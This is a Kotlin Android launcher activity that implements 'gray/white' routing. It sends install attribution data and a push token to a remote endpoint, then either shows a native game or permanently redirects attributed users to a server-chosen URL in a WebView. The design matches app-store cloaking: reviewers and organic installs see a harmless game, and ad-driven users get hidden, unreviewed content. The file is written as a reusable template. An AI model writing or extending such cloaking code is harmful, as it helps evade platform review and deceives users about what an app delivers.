package com.example.grayshell.startup

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.messaging.FirebaseMessaging
import com.example.grayshell.NativeContentActivity
import com.example.grayshell.blueprint.AppBlueprint
import com.example.grayshell.blueprint.ChannelResult
import com.example.grayshell.portal.AlertPortal
import com.example.grayshell.portal.OfflinePortal
import com.example.grayshell.portal.StreamPortal
import com.example.grayshell.reach.ReachDispatch
import com.example.grayshell.signal.PushBus
import com.example.grayshell.vault.DataVault
import com.example.grayshell.wire.NetWire
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import java.util.Locale
import kotlin.coroutines.resume

/**
 * Entry-point router. Shows the branded loading screen while performing
 * gray/white attribution-based routing in the background.
 *
 * State machine — see .cursor/rules/kotlin_launch_flow.mdc, which explains why the
 * order of operations below is not negotiable:
 *
 *  UNDECIDED (first launch):
 *    1. No internet → OfflinePortal ON THE FIRST FRAME. Nothing started, nothing
 *       persisted; the offline screen relaunches this router when the link is
 *       back. Never the game — a link install must still reach the WebView.
 *    2. Has internet → start AppsFlyer NOW (not in the Application) → attribution
 *       + deep link (30s / 5s, in parallel) → fetchConfig → decide
 *       ok+url → STREAM → AlertPortal? → StreamPortal
 *       else   → game, and persist NATIVE only if the endpoint answered AND the
 *                attribution was non-empty
 *
 *  STREAM (was WebView last time):
 *    1. No internet → OfflinePortal with savedUrl
 *    2. Cold push URL → StreamPortal (highest priority)
 *    3. AppsFlyer (10s) → fetchConfig
 *       ok+url    → StreamPortal(newUrl)
 *       fail+savedUrl → StreamPortal(savedUrl)
 *       fail+noSaved  → OfflinePortal
 *
 *  NATIVE (was game last time):
 *    → NativeContentActivity (always, no network needed)
 */
class WelcomePortal : AppCompatActivity() {

    private lateinit var vault: DataVault
    private lateinit var wire: NetWire
    private var splash: com.example.grayshell.LoadingView? = null
    private val scope = CoroutineScope(Dispatchers.Main)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hideSystemUi()
        vault = DataVault(applicationContext)
        wire  = NetWire(applicationContext)

        val pushUrl = intent.takeIf { it.getBooleanExtra(EXTRA_FROM_PUSH, false) }
            ?.getStringExtra(EXTRA_PUSH_URL)
            ?.takeIf { it.isNotBlank() }

        // The shell is still alive behind us, so this is a tap on a notification
        // while the app was in the background. Nothing is drawn here at all: the
        // user should see the page they left, and then the pushed URL when it
        // loads. A splash in between would be a step backwards.
        if (pushUrl != null && PushBus.handOver(pushUrl)) {
            log("Warm push handed to the live shell → $pushUrl")
            finish()
            overridePendingTransition(0, 0)
            return
        }

        // Installed through a link with the radio off. Nothing can be decided and
        // nothing is worth loading, so the offline screen is what the first frame
        // draws — no splash ahead of it and no bar filling for a decision that is
        // not going to be made. The check is the instant one, not the one with a
        // grace period: waiting here is exactly what this avoids, and the offline
        // screen moves on by itself the moment a link appears.
        if (pushUrl == null &&
            vault.runChannel == DataVault.CHANNEL_UNDECIDED &&
            !wire.isConnected()
        ) {
            log("First run with no link → offline screen on the first frame")
            startActivity(Intent(this, OfflinePortal::class.java))
            finish()
            overridePendingTransition(0, 0)
            return
        }

        // Show existing branded loading screen (indeterminate — keeps animating
        // until routing finishes, no premature "full" bar, dots never freeze).
        splash = com.example.grayshell.LoadingView(
            this, indeterminate = true
        ) { /* never auto-completes */ }
        setContentView(splash)

        // Cold start from a push: the shell is not running, so the URL goes through
        // the normal launch — bar and all — and is consumed once.
        if (pushUrl != null) {
            log("Cold push URL received: $pushUrl")
            vault.coldPushUrl = pushUrl
        }

        scope.launch { route() }
    }

    // ── State machine ───────────────────────────────────────────────────

    private suspend fun route() {
        if (AppBlueprint.debugForceStreamUrl.isNotBlank()) {
            log("DEBUG: forcing stream URL ${AppBlueprint.debugForceStreamUrl}")
            goGray(AppBlueprint.debugForceStreamUrl)
            return
        }

        // Cold-push URL always wins — open WebView on it directly.
        val coldPush = vault.coldPushUrl
        if (!coldPush.isNullOrBlank()) {
            log("Cold push URL present → STREAM directly: $coldPush")
            vault.coldPushUrl = null
            // Make sure subsequent launches keep using stream mode.
            if (vault.runChannel == DataVault.CHANNEL_UNDECIDED)
                vault.runChannel = DataVault.CHANNEL_STREAM
            goGray(coldPush)
            return
        }

        when (vault.runChannel) {
            DataVault.CHANNEL_NATIVE -> {
                log("Channel=NATIVE → game")
                goNative()
            }
            DataVault.CHANNEL_STREAM -> {
                log("Channel=STREAM → handleOnlineReturn")
                handleOnlineReturn()
            }
            else -> {
                log("Channel=UNDECIDED → handleFirstLaunch")
                handleFirstLaunch()
            }
        }
    }

    /** First launch — resolve channel from scratch. */
    private suspend fun handleFirstLaunch() {
        if (!ensureInternet(isFirstLaunch = true)) return

        // Only now, with a link in hand, is attribution started. A run that came
        // here from the offline screen is lighting the SDK for the first time, so
        // it gets the same answer a run with a connection would have got.
        val tracker = (applicationContext as AppEntry).trackingDispatch
        tracker.ignite(this)
        tracker.retrace(this)
        val attribution = tracker.awaitAttribution(AppBlueprint.attributionFirstMs)
        log("Attribution (first): $attribution")

        val result = fetchConfig(attribution)
        if (result.active && !result.destination.isNullOrBlank()) {
            vault.runChannel     = DataVault.CHANNEL_STREAM
            vault.destinationUrl = result.destination
            vault.urlExpiresAt   = result.expiresAt
            log("Backend → STREAM: ${result.destination}")
            goGray(result.destination)
        } else {
            // A "no" sticks for the life of the install, so it has to be a real one:
            // the endpoint has to have answered, and it has to have been asked with
            // this install's attribution in hand. Anything else settles nothing —
            // the game opens either way, but the question is left for the next
            // launch instead of being closed on a technicality.
            when {
                !result.answered ->
                    log("Endpoint unreachable → game, decision left open")
                attribution.isEmpty() ->
                    log("No attribution behind the answer → game, decision left open")
                else -> {
                    vault.runChannel = DataVault.CHANNEL_NATIVE
                    log("Backend → NATIVE")
                }
            }
            goNative()
        }
    }

    /** Returning user who was previously in stream (WebView) mode. */
    private suspend fun handleOnlineReturn() {
        if (!ensureInternet(isFirstLaunch = false)) return

        // Cold push URL takes HIGHEST priority.
        val coldPush = vault.consumeColdPushUrl()
        if (!coldPush.isNullOrBlank()) {
            log("Cold push priority → $coldPush")
            goGray(coldPush)
            return
        }

        val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null
        log("SavedUrl=${savedUrl.let { it?.take(40) }}")

        val tracker = (applicationContext as AppEntry).trackingDispatch
        tracker.ignite(this)
        tracker.retrace(this)
        val attribution = tracker.awaitAttribution(AppBlueprint.attributionReturnMs)
        log("Attribution (return): $attribution")

        val result = fetchConfig(attribution)
        when {
            result.active && !result.destination.isNullOrBlank() -> {
                vault.destinationUrl = result.destination
                vault.urlExpiresAt   = result.expiresAt
                log("Backend → STREAM (new): ${result.destination}")
                goGray(result.destination)
            }
            !savedUrl.isNullOrBlank() -> {
                log("Backend fallback → savedUrl: $savedUrl")
                goGray(savedUrl)
            }
            else -> handOver {
                log("No URL available → OfflinePortal")
                startActivity(Intent(this, OfflinePortal::class.java))
                finish()
            }
        }
    }

    /**
     * Second gate, for a link that dies between onCreate and here, or one that is
     * still coming up as the app starts. Short by design — the long wait belongs to
     * the offline screen, which is a screen and not a stalled splash.
     */
    private suspend fun ensureInternet(isFirstLaunch: Boolean): Boolean {
        if (wire.isConnected()) return true

        val online = withTimeoutOrNull(CONNECT_GRACE_MS) {
            suspendCancellableCoroutine<Boolean> { cont ->
                scope.launch {
                    wire.connectivityFlow.collect { ok ->
                        if (ok && cont.isActive) cont.resume(true)
                    }
                }
            }
        } ?: false
        if (online) return true

        log("No internet → offline screen")
        // Even on a first launch: the game would be the wrong answer for an install
        // that arrived through a link, and it is not this branch's place to guess.
        val savedUrl = if (!isFirstLaunch && vault.isUrlValid()) vault.destinationUrl else null
        startActivity(
            Intent(this, OfflinePortal::class.java).apply {
                if (!savedUrl.isNullOrBlank())
                    putExtra(OfflinePortal.EXTRA_RETURN_URL, savedUrl)
            }
        )
        finish()
        overridePendingTransition(0, 0)
        return false
    }

    /** POST to config endpoint and parse the result. */
    private suspend fun fetchConfig(attribution: Map<String, Any?>): ChannelResult {
        val tracker = (applicationContext as AppEntry).trackingDispatch
        val fcmToken = vault.fcmToken ?: getFcmToken()?.also { vault.fcmToken = it }

        val body = tracker.buildRequestBody(
            attributionData = attribution,
            os             = "Android",
            locale         = Locale.getDefault().toLanguageTag().replace('-', '_'),
            pushToken      = fcmToken,
            firebaseProject = AppBlueprint.resolveAnalyticsProject()
        )
        return ReachDispatch(buildUserAgent()).fetchChannel(body)
    }

    // ── Navigation ──────────────────────────────────────────────────────

    /**
     * Nothing leaves this screen until the bar has run out. Whatever comes next —
     * game, WebView, pushed URL — the launch reads the same: the bar fills, a beat
     * passes, the app is there. Navigating on the decision instead would cut the bar
     * off wherever it happened to be.
     */
    private fun handOver(go: () -> Unit) {
        val view = splash
        if (view == null) go() else view.complete { if (!isFinishing) go() }
    }

    private fun goNative() = handOver {
        // TODO(you): point this at your real native game/content host Activity.
        startActivity(
            Intent(this, NativeContentActivity::class.java)
                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        finish()
    }

    private fun goGray(url: String) = handOver {
        if (vault.shouldShowNotifScreen()) {
            startActivity(
                Intent(this, AlertPortal::class.java)
                    .putExtra(AlertPortal.EXTRA_TARGET_URL, url)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
        } else {
            startActivity(
                Intent(this, StreamPortal::class.java)
                    .putExtra(StreamPortal.EXTRA_STREAM_URL, url)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
        }
        finish()
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
    }

    // ── Helpers ─────────────────────────────────────────────────────────

    private suspend fun getFcmToken(): String? =
        withTimeoutOrNull(5_000L) {
            suspendCancellableCoroutine { cont ->
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (cont.isActive) cont.resume(if (task.isSuccessful) task.result else null)
                }
            }
        }

    private fun buildUserAgent(): String =
        "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.BRAND} ${Build.MODEL.replace(" ", "_")})" +
        " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"

    private fun hideSystemUi() {
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
        val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)
        if (fromPush && !pushUrl.isNullOrBlank() && PushBus.handOver(pushUrl)) {
            finish()
            overridePendingTransition(0, 0)
            return
        }
        if (fromPush && !pushUrl.isNullOrBlank()) {
            val dest = vault.destinationUrl?.takeIf { vault.isUrlValid() }
            startActivity(
                Intent(this, StreamPortal::class.java)
                    .putExtra(StreamPortal.EXTRA_STREAM_URL, dest ?: pushUrl)
                    .putExtra(StreamPortal.EXTRA_PUSH_URL, pushUrl)
                    .putExtra(StreamPortal.EXTRA_PUSH_WARM, true)
                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
            finish()
        }
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }

    private fun log(msg: String) { Log.i("WelcomePortal", msg) }

    companion object {
        const val EXTRA_FROM_PUSH = "from_push"
        const val EXTRA_PUSH_URL  = "push_url"

        /** How long a decision waits for a link that may still be coming up. */
        private const val CONNECT_GRACE_MS = 3_000L
    }
}
